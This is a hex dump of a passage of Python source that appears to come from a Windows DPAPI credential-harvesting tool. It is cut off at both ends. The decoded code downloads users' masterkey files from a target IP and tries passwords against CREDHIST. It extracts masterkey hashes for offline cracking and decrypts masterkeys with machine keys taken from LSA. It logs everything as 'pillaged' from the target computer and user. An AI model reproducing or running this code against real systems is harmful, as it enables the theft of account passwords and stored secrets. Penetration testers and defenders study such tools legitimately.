+000145d0: 4372 6564 4869 7374 4669 6c65 2872 6177  CredHistFile(raw
+000145e0: 3d63 7265 6468 6973 7464 6174 6129 0a09  =credhistdata)..
+000145f0: 0909 666f 7220 7573 6572 6e61 6d65 2069  ..for username i
+00014600: 6e20 7365 6c66 2e6f 7074 696f 6e73 2e63  n self.options.c
+00014610: 7265 647a 3a0a 0909 0909 6966 2075 7365  redz:.....if use
+00014620: 726e 616d 6520 696e 2075 7365 722e 7573  rname in user.us
+00014630: 6572 6e61 6d65 3a20 2023 2070 6f75 7220  ername:  # pour 
+00014640: 666f 6e63 7469 6f6e 6e65 7220 6175 7373  fonctionner auss
+00014650: 6920 6176 6563 206c 6520 2e64 6f6d 6169  i avec le .domai
+00014660: 6e20 6f75 206c 6573 2073 6573 7369 6f6e  n ou les session
+00014670: 7320 6d75 6c74 6970 6c65 2063 6974 7269  s multiple citri
+00014680: 7820 656e 2075 7365 722e 646f 6d61 696e  x en user.domain
+00014690: 2e30 3031 203f 0a09 0909 0909 7365 6c66  .001 ?......self
+000146a0: 2e6c 6f67 6769 6e67 2e64 6562 7567 2866  .logging.debug(f
+000146b0: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+000146c0: 7461 7267 6574 5f69 707d 5d20 5b2e 2e2e  target_ip}] [...
+000146d0: 5d20 5465 7374 696e 6720 7b6c 656e 2873  ] Testing {len(s
+000146e0: 656c 662e 6f70 7469 6f6e 732e 6372 6564  elf.options.cred
+000146f0: 7a5b 7573 6572 6e61 6d65 5d29 7d20 6372  z[username])} cr
+00014700: 6564 7a20 666f 7220 7573 6572 207b 7573  edz for user {us
+00014710: 6572 2e75 7365 726e 616d 657d 2043 5245  er.username} CRE
+00014720: 4448 4953 5422 290a 0909 0909 0966 6f72  DHIST")......for
+00014730: 2070 6173 7377 6f72 6420 696e 2073 656c   password in sel
+00014740: 662e 6f70 7469 6f6e 732e 6372 6564 7a5b  f.options.credz[
+00014750: 7573 6572 6e61 6d65 5d3a 0a09 0909 0909  username]:......
+00014760: 0972 6574 3d6d 7943 7265 6468 6973 7466  .ret=myCredhistf
+00014770: 696c 652e 6465 6372 7970 7457 6974 6850  ile.decryptWithP
+00014780: 6173 7377 6f72 6428 7061 7373 776f 7264  assword(password
+00014790: 290a 0909 0909 0909 7072 696e 7428 7265  ).......print(re
+000147a0: 7429 0a09 0909 2727 270a 0909 6578 6365  t)....'''...exce
+000147b0: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
+000147c0: 6578 3a0a 0909 0973 656c 662e 6c6f 6767  ex:....self.logg
+000147d0: 696e 672e 6572 726f 7228 6622 5b7b 7365  ing.error(f"[{se
+000147e0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+000147f0: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+00014800: 4641 494c 7d45 7272 6f72 2069 6e20 4465  FAIL}Error in De
+00014810: 6372 7970 7469 6e67 2043 7265 6468 6973  crypting Credhis
+00014820: 747b 6263 6f6c 6f72 732e 454e 4443 7d22  t{bcolors.ENDC}"
+00014830: 290a 0909 0973 656c 662e 6c6f 6767 696e  )....self.loggin
+00014840: 672e 6465 6275 6728 6578 290a 0a09 6465  g.debug(ex)...de
+00014850: 6620 646f 776e 6c6f 6164 5f6d 6173 7465  f download_maste
+00014860: 726b 6579 2873 656c 662c 2075 7365 722c  rkey(self, user,
+00014870: 2070 6174 682c 2067 7569 642c 2074 7970   path, guid, typ
+00014880: 6529 3a0a 0909 6775 6964 203d 2067 7569  e):...guid = gui
+00014890: 642e 6c6f 7765 7228 290a 0909 6966 2069  d.lower()...if i
+000148a0: 735f 6775 6964 2867 7569 6429 3a0a 0909  s_guid(guid):...
+000148b0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+000148c0: 6275 6728 6622 5b7b 7365 6c66 2e6f 7074  bug(f"[{self.opt
+000148d0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+000148e0: 207b 7573 6572 2e75 7365 726e 616d 657d   {user.username}
+000148f0: 202d 2046 6f75 6e64 2047 5549 4420 7b67   - Found GUID {g
+00014900: 7569 647d 2229 0a09 0923 2044 6f77 6e6c  uid}")...# Downl
+00014910: 6f61 6469 6e67 2066 696c 650a 0909 6c6f  oading file...lo
+00014920: 6361 6c66 696c 6520 3d20 7365 6c66 2e6d  calfile = self.m
+00014930: 7966 696c 656f 7073 2e67 6574 5f66 696c  yfileops.get_fil
+00014940: 6528 6e74 7061 7468 2e6a 6f69 6e28 7061  e(ntpath.join(pa
+00014950: 7468 2c20 6775 6964 2929 0a09 0923 2047  th, guid))...# G
+00014960: 6574 2054 7970 6520 616e 6420 6861 7368  et Type and hash
+00014970: 0a09 0974 7279 3a0a 0909 096d 796f 7074  ...try:....myopt
+00014980: 696f 6e73 203d 2063 6f70 792e 6465 6570  ions = copy.deep
+00014990: 636f 7079 2873 656c 662e 6f70 7469 6f6e  copy(self.option
+000149a0: 7329 0a09 0909 6d79 6f70 7469 6f6e 732e  s)....myoptions.
+000149b0: 7369 6420 3d20 7573 6572 2e73 6964 0a09  sid = user.sid..
+000149c0: 0909 6d79 6f70 7469 6f6e 732e 7573 6572  ..myoptions.user
+000149d0: 6e61 6d65 203d 2075 7365 722e 7573 6572  name = user.user
+000149e0: 6e61 6d65 0a09 0909 6d79 6f70 7469 6f6e  name....myoption
+000149f0: 732e 7076 6b20 3d20 4e6f 6e65 0a09 0909  s.pvk = None....
+00014a00: 6d79 6f70 7469 6f6e 732e 6669 6c65 203d  myoptions.file =
+00014a10: 206c 6f63 616c 6669 6c65 2020 2320 4d61   localfile  # Ma
+00014a20: 7374 6572 6b65 7966 696c 6520 746f 2070  sterkeyfile to p
+00014a30: 6172 7365 0a09 0909 2320 6d79 6f70 7469  arse....# myopti
+00014a40: 6f6e 732e 6b65 7920 3d20 6b65 792e 6465  ons.key = key.de
+00014a50: 636f 6465 2822 7574 662d 3822 290a 0909  code("utf-8")...
+00014a60: 096d 7964 7061 7069 203d 2044 5041 5049  .mydpapi = DPAPI
+00014a70: 286d 796f 7074 696f 6e73 2c20 7365 6c66  (myoptions, self
+00014a80: 2e6c 6f67 6769 6e67 290a 0909 0969 6620  .logging)....if 
+00014a90: 7365 6c66 2e6f 7074 696f 6e73 2e47 6574  self.options.Get
+00014aa0: 4861 7368 6573 203d 3d20 5472 7565 3a0a  Hashes == True:.
+00014ab0: 0909 0909 6d61 7374 6572 6b65 795f 6861  ....masterkey_ha
+00014ac0: 7368 2c20 6973 5f64 6f6d 6169 6e5f 7369  sh, is_domain_si
+00014ad0: 6420 3d20 6d79 6470 6170 692e 6765 745f  d = mydpapi.get_
+00014ae0: 6d61 7374 6572 6b65 795f 6861 7368 2867  masterkey_hash(g
+00014af0: 656e 6572 6174 655f 6861 7368 3d54 7275  enerate_hash=Tru
+00014b00: 6529 0a09 0909 656c 7365 3a0a 0909 0909  e)....else:.....
+00014b10: 6d61 7374 6572 6b65 795f 6861 7368 2c20  masterkey_hash, 
+00014b20: 6973 5f64 6f6d 6169 6e5f 7369 6420 3d20  is_domain_sid = 
+00014b30: 6d79 6470 6170 692e 6765 745f 6d61 7374  mydpapi.get_mast
+00014b40: 6572 6b65 795f 6861 7368 2867 656e 6572  erkey_hash(gener
+00014b50: 6174 655f 6861 7368 3d46 616c 7365 290a  ate_hash=False).
+00014b60: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
+00014b70: 6f6e 2061 7320 6578 3a0a 0909 0973 656c  on as ex:....sel
+00014b80: 662e 6c6f 6767 696e 672e 6572 726f 7228  f.logging.error(
+00014b90: 0a09 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+00014ba0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+00014bb0: 5d20 7b62 636f 6c6f 7273 2e46 4149 4c7d  ] {bcolors.FAIL}
+00014bc0: 4572 726f 7220 696e 2044 6f77 6e6c 6f61  Error in Downloa
+00014bd0: 644d 6173 7465 726b 6579 202d 2067 6574  dMasterkey - get
+00014be0: 5f6d 6173 7465 726b 6579 5f68 6173 687b  _masterkey_hash{
+00014bf0: 6263 6f6c 6f72 732e 454e 4443 7d22 290a  bcolors.ENDC}").
+00014c00: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00014c10: 6465 6275 6728 6578 290a 0909 7472 793a  debug(ex)...try:
+00014c20: 0a09 0909 7573 6572 2e6d 6173 7465 726b  ....user.masterk
+00014c30: 6579 735f 6669 6c65 5b67 7569 645d 203d  eys_file[guid] =
+00014c40: 207b 7d0a 0909 0975 7365 722e 6d61 7374   {}....user.mast
+00014c50: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+00014c60: 5d5b 2770 6174 6827 5d20 3d20 6c6f 6361  ]['path'] = loca
+00014c70: 6c66 696c 650a 0909 0975 7365 722e 6d61  lfile....user.ma
+00014c80: 7374 6572 6b65 7973 5f66 696c 655b 6775  sterkeys_file[gu
+00014c90: 6964 5d5b 2773 7461 7475 7327 5d20 3d20  id]['status'] = 
+00014ca0: 2765 6e63 7279 7074 6564 270a 0909 0969  'encrypted'....i
+00014cb0: 6620 7365 6c66 2e6f 7074 696f 6e73 2e47  f self.options.G
+00014cc0: 6574 4861 7368 6573 203d 3d20 5472 7565  etHashes == True
+00014cd0: 3a0a 0909 0909 7573 6572 2e6d 6173 7465  :.....user.maste
+00014ce0: 726b 6579 735f 6669 6c65 5b67 7569 645d  rkeys_file[guid]
+00014cf0: 5b27 6861 7368 275d 203d 206d 6173 7465  ['hash'] = maste
+00014d00: 726b 6579 5f68 6173 680a 0909 0969 6620  rkey_hash....if 
+00014d10: 6973 5f64 6f6d 6169 6e5f 7369 6420 616e  is_domain_sid an
+00014d20: 6420 7573 6572 2e75 7365 726e 616d 6520  d user.username 
+00014d30: 213d 2027 4d41 4348 494e 4524 273a 0a09  != 'MACHINE$':..
+00014d40: 0909 0974 7970 6520 3d20 2744 4f4d 4149  ...type = 'DOMAI
+00014d50: 4e27 0a09 0909 0975 7365 722e 7479 7065  N'.....user.type
+00014d60: 5f76 616c 6964 6174 6564 203d 2054 7275  _validated = Tru
+00014d70: 650a 0909 0909 7573 6572 2e74 7970 6520  e.....user.type 
+00014d80: 3d20 7479 7065 2020 2320 4c4f 4341 4c2c  = type  # LOCAL,
+00014d90: 444f 4d41 494e 2c4d 4143 4849 4e45 2c4d  DOMAIN,MACHINE,M
+00014da0: 4143 4849 4e45 2d55 5345 520a 0909 0973  ACHINE-USER....s
+00014db0: 656c 662e 6462 2e61 6464 5f73 6964 2875  elf.db.add_sid(u
+00014dc0: 7365 726e 616d 653d 7573 6572 2e75 7365  sername=user.use
+00014dd0: 726e 616d 652c 2073 6964 3d75 7365 722e  rname, sid=user.
+00014de0: 7369 6429 0a09 0909 7365 6c66 2e64 622e  sid)....self.db.
+00014df0: 6164 645f 6d61 7374 6572 6b65 7928 6669  add_masterkey(fi
+00014e00: 6c65 5f70 6174 683d 7573 6572 2e6d 6173  le_path=user.mas
+00014e10: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
+00014e20: 645d 5b27 7061 7468 275d 2c20 6775 6964  d]['path'], guid
+00014e30: 3d67 7569 642c 0a09 0909 0909 0909 0920  =guid,......... 
+00014e40: 2073 7461 7475 733d 7573 6572 2e6d 6173   status=user.mas
+00014e50: 7465 726b 6579 735f 6669 6c65 5b67 7569  terkeys_file[gui
+00014e60: 645d 5b27 7374 6174 7573 275d 2c0a 0909  d]['status'],...
+00014e70: 0909 0909 0909 2020 7069 6c6c 6167 6564  ......  pillaged
+00014e80: 5f66 726f 6d5f 636f 6d70 7574 6572 5f69  _from_computer_i
+00014e90: 703d 7365 6c66 2e6f 7074 696f 6e73 2e74  p=self.options.t
+00014ea0: 6172 6765 745f 6970 2c0a 0909 0909 0909  arget_ip,.......
+00014eb0: 0909 2020 7069 6c6c 6167 6564 5f66 726f  ..  pillaged_fro
+00014ec0: 6d5f 7573 6572 6e61 6d65 3d75 7365 722e  m_username=user.
+00014ed0: 7573 6572 6e61 6d65 290a 0909 0969 6620  username)....if 
+00014ee0: 7365 6c66 2e6f 7074 696f 6e73 2e47 6574  self.options.Get
+00014ef0: 4861 7368 6573 203d 3d20 5472 7565 3a0a  Hashes == True:.
+00014f00: 0909 0909 666f 7220 6861 7368 2069 6e20  ....for hash in 
+00014f10: 7573 6572 2e6d 6173 7465 726b 6579 735f  user.masterkeys_
+00014f20: 6669 6c65 5b67 7569 645d 5b27 6861 7368  file[guid]['hash
+00014f30: 275d 3a0a 0909 0909 0973 656c 662e 6462  ']:......self.db
+00014f40: 2e61 6464 5f64 7061 7069 5f68 6173 6828  .add_dpapi_hash(
+00014f50: 6669 6c65 5f70 6174 683d 7573 6572 2e6d  file_path=user.m
+00014f60: 6173 7465 726b 6579 735f 6669 6c65 5b67  asterkeys_file[g
+00014f70: 7569 645d 5b27 7061 7468 275d 2c20 7369  uid]['path'], si
+00014f80: 643d 7573 6572 2e73 6964 2c20 6775 6964  d=user.sid, guid
+00014f90: 3d67 7569 642c 0a09 0909 0909 0909 0909  =guid,..........
+00014fa0: 0920 2020 6861 7368 3d68 6173 682c 2063  .   hash=hash, c
+00014fb0: 6f6e 7465 7874 3d74 7970 652c 2070 696c  ontext=type, pil
+00014fc0: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
+00014fd0: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
+00014fe0: 6f6e 732e 7461 7267 6574 5f69 7029 0a09  ons.target_ip)..
+00014ff0: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
+00015000: 6e20 6173 2065 783a 0a09 0909 7365 6c66  n as ex:....self
+00015010: 2e6c 6f67 6769 6e67 2e65 7272 6f72 280a  .logging.error(.
+00015020: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00015030: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00015040: 207b 6263 6f6c 6f72 732e 4641 494c 7d45   {bcolors.FAIL}E
+00015050: 7272 6f72 2069 6e20 4461 7461 6261 7365  rror in Database
+00015060: 2065 6e74 7279 202d 2064 6f77 6e6c 6f61   entry - downloa
+00015070: 645f 6d61 7374 6572 6b65 795f 6861 7368  d_masterkey_hash
+00015080: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+00015090: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+000150a0: 2e64 6562 7567 2865 7829 0a0a 0964 6566  .debug(ex)...def
+000150b0: 2067 6574 5f6d 6173 7465 726b 6579 2873   get_masterkey(s
+000150c0: 656c 662c 2075 7365 722c 2067 7569 642c  elf, user, guid,
+000150d0: 2074 7970 6529 3a0a 0909 6775 6964 203d   type):...guid =
+000150e0: 2067 7569 642e 6c6f 7765 7228 290a 0909   guid.lower()...
+000150f0: 6966 2067 7569 6420 6e6f 7420 696e 2075  if guid not in u
+00015100: 7365 722e 6d61 7374 6572 6b65 7973 5f66  ser.masterkeys_f
+00015110: 696c 653a 0a09 0909 7365 6c66 2e6c 6f67  ile:....self.log
+00015120: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+00015130: 6622 5b7b 7365 6c66 2e6f 7074 696f 6e73  f"[{self.options
+00015140: 2e74 6172 6765 745f 6970 7d5d 205b 215d  .target_ip}] [!]
+00015150: 207b 6263 6f6c 6f72 732e 4641 494c 7d7b   {bcolors.FAIL}{
+00015160: 7573 6572 2e75 7365 726e 616d 657d 7b62  user.username}{b
+00015170: 636f 6c6f 7273 2e45 4e44 437d 206d 6173  colors.ENDC} mas
+00015180: 7465 726b 6579 207b 6775 6964 7d20 6e6f  terkey {guid} no
+00015190: 7420 666f 756e 6422 290a 0909 0972 6574  t found")....ret
+000151a0: 7572 6e20 2d31 0a09 0965 6c73 653a 0a09  urn -1...else:..
+000151b0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+000151c0: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
+000151d0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+000151e0: 745f 6970 7d5d 205b 2d5d 207b 6263 6f6c  t_ip}] [-] {bcol
+000151f0: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
+00015200: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
+00015210: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
+00015220: 6579 207b 6775 6964 7d20 466f 756e 6422  ey {guid} Found"
+00015230: 290a 0909 6966 2075 7365 722e 6d61 7374  )...if user.mast
+00015240: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+00015250: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
+00015260: 6465 6372 7970 7465 6427 3a0a 0909 0973  decrypted':....s
+00015270: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00015280: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
+00015290: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+000152a0: 707d 5d20 5b2d 5d20 7b62 636f 6c6f 7273  p}] [-] {bcolors
+000152b0: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
+000152c0: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
+000152d0: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
+000152e0: 7b67 7569 647d 2061 6c72 6561 6479 2064  {guid} already d
+000152f0: 6563 7279 7074 6564 2229 0a09 0909 7265  ecrypted")....re
+00015300: 7475 726e 2075 7365 722e 6d61 7374 6572  turn user.master
+00015310: 6b65 7973 5f66 696c 655b 6775 6964 5d0a  keys_file[guid].
+00015320: 0909 656c 6966 2075 7365 722e 6d61 7374  ..elif user.mast
+00015330: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+00015340: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
+00015350: 656e 6372 7970 7465 6427 3a0a 0909 0972  encrypted':....r
+00015360: 6574 7572 6e20 7365 6c66 2e64 6563 7279  eturn self.decry
+00015370: 7074 5f6d 6173 7465 726b 6579 2875 7365  pt_masterkey(use
+00015380: 722c 2067 7569 642c 2074 7970 652c 2074  r, guid, type, t
+00015390: 6573 7465 645f 7479 7065 3d5b 5d29 0a0a  ested_type=[])..
+000153a0: 0964 6566 2064 6563 7279 7074 5f6d 6173  .def decrypt_mas
+000153b0: 7465 726b 6579 2873 656c 662c 2075 7365  terkey(self, use
+000153c0: 722c 2067 7569 642c 2074 7970 653d 2727  r, guid, type=''
+000153d0: 2c20 7465 7374 6564 5f74 7970 653d 5b5d  , tested_type=[]
+000153e0: 293a 0a0a 0909 7365 6c66 2e6c 6f67 6769  ):....self.loggi
+000153f0: 6e67 2e64 6562 7567 280a 0909 0966 225b  ng.debug(....f"[
+00015400: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00015410: 7267 6574 5f69 707d 5d20 5b2e 2e2e 5d20  rget_ip}] [...] 
+00015420: 4465 6372 7970 7469 6e67 207b 6263 6f6c  Decrypting {bcol
+00015430: 6f72 732e 4f4b 424c 5545 7d7b 7573 6572  ors.OKBLUE}{user
+00015440: 2e75 7365 726e 616d 657d 7b62 636f 6c6f  .username}{bcolo
+00015450: 7273 2e45 4e44 437d 206d 6173 7465 726b  rs.ENDC} masterk
+00015460: 6579 207b 6775 6964 7d20 6f66 2074 7970  ey {guid} of typ
+00015470: 6520 7b74 7970 657d 2028 7479 7065 5f76  e {type} (type_v
+00015480: 616c 6964 6174 6564 3d7b 7573 6572 2e74  alidated={user.t
+00015490: 7970 655f 7661 6c69 6461 7465 647d 2f75  ype_validated}/u
+000154a0: 7365 722e 7479 7065 3d7b 7573 6572 2e74  ser.type={user.t
+000154b0: 7970 657d 2920 2d20 7465 7374 6564 203a  ype}) - tested :
+000154c0: 207b 7465 7374 6564 5f74 7970 657d 2229   {tested_type}")
+000154d0: 0a09 0967 7569 6420 3d20 6775 6964 2e6c  ...guid = guid.l
+000154e0: 6f77 6572 2829 0a09 0969 6620 6775 6964  ower()...if guid
+000154f0: 206e 6f74 2069 6e20 7573 6572 2e6d 6173   not in user.mas
+00015500: 7465 726b 6579 735f 6669 6c65 3a0a 0909  terkeys_file:...
+00015510: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+00015520: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
+00015530: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+00015540: 5f69 707d 5d20 5b21 5d20 7b62 636f 6c6f  _ip}] [!] {bcolo
+00015550: 7273 2e46 4149 4c7d 7b75 7365 722e 7573  rs.FAIL}{user.us
+00015560: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
+00015570: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
+00015580: 7b67 7569 647d 206e 6f74 2066 6f75 6e64  {guid} not found
+00015590: 2229 0a09 0909 7265 7475 726e 202d 310a  ")....return -1.
+000155a0: 0909 6c6f 6361 6c66 696c 6520 3d20 7573  ..localfile = us
+000155b0: 6572 2e6d 6173 7465 726b 6579 735f 6669  er.masterkeys_fi
+000155c0: 6c65 5b67 7569 645d 5b27 7061 7468 275d  le[guid]['path']
+000155d0: 0a0a 0909 6966 2075 7365 722e 6d61 7374  ....if user.mast
+000155e0: 6572 6b65 7973 5f66 696c 655b 6775 6964  erkeys_file[guid
+000155f0: 5d5b 2773 7461 7475 7327 5d20 3d3d 2027  ]['status'] == '
+00015600: 6465 6372 7970 7465 6427 3a0a 0909 0973  decrypted':....s
+00015610: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00015620: 6728 0a09 0909 0966 225b 7b73 656c 662e  g(.....f"[{self.
+00015630: 6f70 7469 6f6e 732e 7461 7267 6574 5f69  options.target_i
+00015640: 707d 5d20 5b2d 5d20 7b62 636f 6c6f 7273  p}] [-] {bcolors
+00015650: 2e4f 4b42 4c55 457d 7b75 7365 722e 7573  .OKBLUE}{user.us
+00015660: 6572 6e61 6d65 7d7b 6263 6f6c 6f72 732e  ername}{bcolors.
+00015670: 454e 4443 7d20 6d61 7374 6572 6b65 7920  ENDC} masterkey 
+00015680: 7b67 7569 647d 2061 6c72 6561 6479 2064  {guid} already d
+00015690: 6563 7279 7074 6564 2229 0a09 0909 7265  ecrypted")....re
+000156a0: 7475 726e 2075 7365 722e 6d61 7374 6572  turn user.master
+000156b0: 6b65 7973 5f66 696c 655b 6775 6964 5d0a  keys_file[guid].
+000156c0: 0909 656c 7365 3a0a 0909 0923 2069 6620  ..else:....# if 
+000156d0: 7573 6572 2e74 7970 655f 7661 6c69 6461  user.type_valida
+000156e0: 7465 6420 3d3d 2054 7275 653a 0a09 0909  ted == True:....
+000156f0: 2309 7479 7065 3d75 7365 722e 7479 7065  #.type=user.type
+00015700: 0a09 0909 6966 2074 7970 6520 3d3d 2027  ....if type == '
+00015710: 273a 0a09 0909 0974 7970 6520 3d20 7573  ':.....type = us
+00015720: 6572 2e74 7970 650a 0a09 0909 6966 2027  er.type.....if '
+00015730: 4d41 4348 494e 4527 2069 6e20 7465 7374  MACHINE' in test
+00015740: 6564 5f74 7970 6520 616e 6420 274d 4143  ed_type and 'MAC
+00015750: 4849 4e45 2d55 5345 5227 2069 6e20 7465  HINE-USER' in te
+00015760: 7374 6564 5f74 7970 6520 616e 6420 2744  sted_type and 'D
+00015770: 4f4d 4149 4e27 2069 6e20 7465 7374 6564  OMAIN' in tested
+00015780: 5f74 7970 6520 616e 6420 274c 4f43 414c  _type and 'LOCAL
+00015790: 2720 696e 2074 6573 7465 645f 7479 7065  ' in tested_type
+000157a0: 3a0a 0909 0909 7365 6c66 2e6c 6f67 6769  :.....self.loggi
+000157b0: 6e67 2e64 6562 7567 280a 0909 0909 0966  ng.debug(......f
+000157c0: 225b 7b73 656c 662e 6f70 7469 6f6e 732e  "[{self.options.
+000157d0: 7461 7267 6574 5f69 707d 5d20 5b21 5d20  target_ip}] [!] 
+000157e0: 7b62 636f 6c6f 7273 2e46 4149 4c7d 7b75  {bcolors.FAIL}{u
+000157f0: 7365 722e 7573 6572 6e61 6d65 7d7b 6263  ser.username}{bc
+00015800: 6f6c 6f72 732e 454e 4443 7d20 6d61 7374  olors.ENDC} mast
+00015810: 6572 6b65 7920 7b67 7569 647d 203a 2041  erkey {guid} : A
+00015820: 6c6c 2064 6563 7279 7074 696f 6e20 7479  ll decryption ty
+00015830: 7065 2066 6169 6c65 6422 290a 0909 0909  pe failed").....
+00015840: 7265 7475 726e 202d 310a 0a09 0909 6966  return -1.....if
+00015850: 2074 7970 6520 3d3d 2027 4d41 4348 494e   type == 'MACHIN
+00015860: 4527 3a0a 0909 0909 2320 5472 7920 6465  E':.....# Try de
+00015870: 2064 6563 7279 7074 206d 6173 7465 726b   decrypt masterk
+00015880: 6579 2066 696c 650a 0909 0909 666f 7220  ey file.....for 
+00015890: 6b65 7920 696e 2073 656c 662e 6d61 6368  key in self.mach
+000158a0: 696e 655f 6b65 793a 0a09 0909 0909 7365  ine_key:......se
+000158b0: 6c66 2e6c 6f67 6769 6e67 2e64 6562 7567  lf.logging.debug
+000158c0: 280a 0909 0909 0909 6622 5b7b 7365 6c66  (.......f"[{self
+000158d0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+000158e0: 6970 7d5d 205b 2e2e 2e5d 2044 6563 7279  ip}] [...] Decry
+000158f0: 7074 696e 6720 7b62 636f 6c6f 7273 2e4f  pting {bcolors.O
+00015900: 4b42 4c55 457d 7b75 7365 722e 7573 6572  KBLUE}{user.user
+00015910: 6e61 6d65 7d7b 6263 6f6c 6f72 732e 454e  name}{bcolors.EN
+00015920: 4443 7d20 6d61 7374 6572 6b65 7920 7b67  DC} masterkey {g
+00015930: 7569 647d 2077 6974 6820 4d41 4348 494e  uid} with MACHIN
+00015940: 455f 4b65 7920 6672 6f6d 204c 5341 207b  E_Key from LSA {
+00015950: 6b65 792e 6465 636f 6465 2827 7574 662d  key.decode('utf-
+00015960: 3827 297d 2229 0a09 0909 0909 7472 793a  8')}")......try:
+00015970: 0a09 0909 0909 096d 796f 7074 696f 6e73  .......myoptions
+00015980: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
+00015990: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
+000159a0: 0909 0909 096d 796f 7074 696f 6e73 2e73  .....myoptions.s
+000159b0: 6964 203d 204e 6f6e 6520 2023 2075 7365  id = None  # use
+000159c0: 722e 7369 640a 0909 0909 0909 6d79 6f70  r.sid.......myop
+000159d0: 7469 6f6e 732e 7573 6572 6e61 6d65 203d  tions.username =
+000159e0: 2075 7365 722e 7573 6572 6e61 6d65 0a09   user.username..
+000159f0: 0909 0909 096d 796f 7074 696f 6e73 2e70  .....myoptions.p
+00015a00: 766b 203d 204e 6f6e 650a 0909 0909 0909  vk = None.......
+00015a10: 6d79 6f70 7469 6f6e 732e 6669 6c65 203d  myoptions.file =
+00015a20: 206c 6f63 616c 6669 6c65 2020 2320 4d61   localfile  # Ma
+00015a30: 7374 6572 6b65 7966 696c 6520 746f 2070  sterkeyfile to p
+00015a40: 6172 7365 0a09 0909 0909 096d 796f 7074  arse.......myopt
+00015a50: 696f 6e73 2e6b 6579 203d 206b 6579 2e64  ions.key = key.d
+00015a60: 6563 6f64 6528 2275 7466 2d38 2229 0a09  ecode("utf-8")..
+00015a70: 0909 0909 096d 7964 7061 7069 203d 2044  .....mydpapi = D
+00015a80: 5041 5049 286d 796f 7074 696f 6e73 2c20  PAPI(myoptions, 
+00015a90: 7365 6c66 2e6c 6f67 6769 6e67 290a 0909  self.logging)...
+00015aa0: 0909 0909 6465 6372 7970 7465 645f 6d61  ....decrypted_ma
+00015ab0: 7374 6572 6b65 7920 3d20 6d79 6470 6170  sterkey = mydpap
+00015ac0: 692e 6465 6372 7970 745f 6d61 7374 6572  i.decrypt_master
+00015ad0: 6b65 7928 290a 0909 0909 0909 6966 2064  key().......if d
+00015ae0: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
+00015af0: 6579 2021 3d20 4e6f 6e65 2061 6e64 2064  ey != None and d
+00015b00: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
+00015b10: 6579 2021 3d20 2d31 3a0a 0909 0909 0909  ey != -1:.......
+00015b20: 0923 2073 656c 662e 6c6f 6767 696e 672e  .# self.logging.
+00015b30: 6465 6275 6728 6622 5b7b 7365 6c66 2e6f  debug(f"[{self.o
+00015b40: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+00015b50: 7d5d 207b 6263 6f6c 6f72 732e 4f4b 4752  }] {bcolors.OKGR
+00015b60: 4545 4e7d 5b2e 2e2e 5d20 4d61 7365 726b  EEN}[...] Maserk
+00015b70: 6579 207b 6263 6f6c 6f72 732e 454e 4443  ey {bcolors.ENDC
+00015b80: 7d7b 6c6f 6361 6c66 696c 657d 2020 7b62  }{localfile}  {b
+00015b90: 636f 6c6f 7273 2e45 4e44 437d 3a20 7b64  colors.ENDC}: {d
+00015ba0: 6563 7279 7074 6564 5f6d 6173 7465 726b  ecrypted_masterk
+00015bb0: 6579 7d22 2029 0a09 0909 0909 0909 7573  ey}" )........us
